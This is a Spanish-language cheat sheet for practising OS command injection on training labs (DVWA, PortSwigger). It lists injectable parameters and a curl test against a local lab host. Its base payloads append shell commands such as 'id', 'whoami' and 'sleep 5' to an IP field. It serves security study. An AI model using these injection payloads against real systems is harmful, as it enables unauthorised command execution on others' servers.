<div align="center">

# 💻 Command Injection
### Inyección de Comandos del Sistema

</div>

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | Command Injection |
| **PortSwigger** | OS command injection |

---

## 🛠️ Herramientas

- **Caido**: `Replay`
- `curl`
- `interactsh-client` para OOB si aplica

---

## 🔍 Entradas Típicas

- `ip=`
- `host=`
- `domain=`
- `ping=`
- `nslookup=`
- `filename=`

---

## 🧪 Payloads Base

### Linux

```text
127.0.0.1;id
127.0.0.1&&id
127.0.0.1|id
127.0.0.1`id`
127.0.0.1$(id)
```

### Windows

```text
127.0.0.1 & whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
```

### Blind

```text
127.0.0.1;sleep 5
127.0.0.1&&timeout 5
```

---

## 🔁 Flujo con Caido

1. Capturar request funcional.
2. En `Replay`, cambiar input por:

```text
127.0.0.1;id
```

3. Si no hay output:
   - probar delay
   - probar callback OAST

4. Medir:
   - contenido response
   - tiempo
   - errores de shell

---

## ⚙️ Comandos Útiles

```bash
curl -i "http://dvwa.local/vulnerabilities/exec/?ip=127.0.0.1;id&Submit=Submit#"
```

---

## 🧠 Señales

| Señal | Lectura |
|-------|---------|
| output de `uid=` / `whoami` | command injection directa |
| retraso reproducible | blind command injection |
| callback DNS/HTTP | OOB |

---

## 🧭 Ruta de Práctica

1. DVWA Command Injection
2. PortSwigger: useful commands
3. PortSwigger: blind via time delay
4. PortSwigger: blind via OAST

---

## 📝 Checklist

- separador válido detectado
- shell target inferida
- output o señal lateral confirmada
- payload mínimo reproducible
